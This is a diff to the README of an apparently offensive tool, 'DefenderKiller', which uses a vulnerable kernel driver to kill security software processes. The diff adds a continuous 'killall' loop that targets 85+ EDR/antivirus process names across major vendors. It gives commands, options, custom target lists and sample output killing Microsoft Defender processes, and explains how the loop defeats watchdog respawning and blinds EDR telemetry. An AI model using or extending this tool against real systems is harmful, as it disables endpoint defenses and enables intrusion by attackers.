@@ -40,21 +40,102 @@ Every BYOVD tool out there relies on third-party drivers. DefenderKiller uses **
 ```
 DefenderKiller.exe load C:\path\to\KSLDriver_2011.sys
 DefenderKiller.exe kill <PID or process name>
+DefenderKiller.exe killall [--interval <ms>] [--list <file>]
 DefenderKiller.exe unload
 ```
 
-### Example
+### Commands
+
+| Command | Description |
+|---------|-------------|
+| `load <driver_path>` | Load KSLDriver.sys and register the kernel service |
+| `kill <PID \| name>` | Terminate a single process by PID or name |
+| `killall` | Continuous loop that scans for and kills all known EDR/AV processes |
+| `unload` | Stop the driver and remove the service |
+
+### killall Options
+
+| Option | Default | Description |
+|--------|---------|-------------|
+| `--interval <ms>` | 500 | Time between sweeps in milliseconds (minimum 100) |
+| `--list <file>` | — | Path to a text file with additional process names to target (one per line, `#` comments supported) |
+
+### Example — Single Kill
 
 ```
 C:\> DefenderKiller.exe load C:\KSLDriver_2011.sys
-[+] Loaded
+[+] Driver loaded successfully
 
-C:\> DefenderKiller.exe kill EDR_PROCESS.exe
-[+] Killed 4628
+C:\> DefenderKiller.exe kill MsMpEng.exe
+[+] Killed MsMpEng.exe (PID 4628)
 
 C:\> DefenderKiller.exe unload
-[+] Unloaded
+[+] Driver unloaded and service removed
 ```
+
+### Example — Continuous EDR Kill Loop
+
+```
+C:\> DefenderKiller.exe load C:\KSLDriver_2011.sys
+[+] Driver loaded successfully
+
+C:\> DefenderKiller.exe killall
+[*] EDR killer loop started (85 built-in + 0 custom targets)
+[*] Scan interval: 500 ms
+[*] Press Ctrl+C to stop
+
+[+] Killed MsMpEng.exe (PID 4628)
+[+] Killed MsSense.exe (PID 3912)
+[*] Sweep #1: killed 2 processes (total: 2)
+[+] Killed MsMpEng.exe (PID 7104)
+[*] Sweep #4: killed 1 processes (total: 3)
+```
+
+### Example — Custom Target List
+
+```
+C:\> type custom_edr.txt
+# Custom EDR processes for this engagement
+CustomEDR.exe
+InternalAV.exe
+MonitorSvc.exe
+
+C:\> DefenderKiller.exe killall --interval 1000 --list custom_edr.txt
+[*] Loaded 3 custom targets from custom_edr.txt
+[*] EDR killer loop started (85 built-in + 3 custom targets)
+[*] Scan interval: 1000 ms
+[*] Press Ctrl+C to stop
+```
+
+## EDR Kill Loop — Why It Matters
+
+The original PoC demonstrated the kernel kill primitive but only targeted a single process once. In real engagements, this isn't enough:
+
+- **Watchdog services** — Most EDRs run a watchdog that respawns the main agent within seconds of termination
+- **Multiple processes** — A single EDR product may run 3-5+ processes (sensor, UI, update service, etc.)
+- **Layered defenses** — Targets often run multiple security products simultaneously
+
+The `killall` command solves this by continuously sweeping the process list and terminating any EDR process that appears. It includes a built-in database of 85+ process names covering major EDR/AV vendors:
+
+- Microsoft Defender / MDE
+- CrowdStrike Falcon
+- SentinelOne
+- VMware Carbon Black
+- Palo Alto Cortex XDR
+- Sophos
+- Elastic EDR
+- Symantec / Broadcom
+- Trend Micro
+- ESET
+- Cylance
+- McAfee / Trellix
+- Kaspersky
+- Bitdefender
+- F-Secure / WithSecure
+- Malwarebytes
+- Fortinet FortiEDR
+- Cybereason
+- Qualys
 
 ## Driver Details
 
@@ -80,7 +161,7 @@ C:\> DefenderKiller.exe unload
 
 ## Note
 
-This is a simple POC that demonstrates the kill primitive. Some EDRs will respawn their processes through a watchdog service or a secondary kernel component. To handle that, you can weaponize this further by running the kill in a loop targeting all known EDR process names.
+The `killall` command addresses the main limitation of the original PoC — EDR process respawning. However, some kernel-level EDR components (minifilter drivers, ETW providers) will remain loaded even after their usermode processes are killed. The kill loop keeps the usermode components down, which is sufficient to blind most EDR telemetry pipelines, but kernel callbacks may still fire. Combine with other techniques as needed for full coverage.
 
 ## Author
 
